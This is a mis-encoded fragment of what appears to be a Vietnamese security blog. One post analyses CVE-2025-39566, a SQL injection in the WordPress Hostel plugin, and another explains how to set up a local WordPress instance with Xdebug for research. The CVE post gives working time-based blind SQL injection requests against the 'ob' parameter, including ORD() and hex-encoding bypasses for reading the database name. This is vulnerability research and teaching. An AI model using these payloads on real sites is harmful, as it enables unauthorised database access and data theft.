__(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— 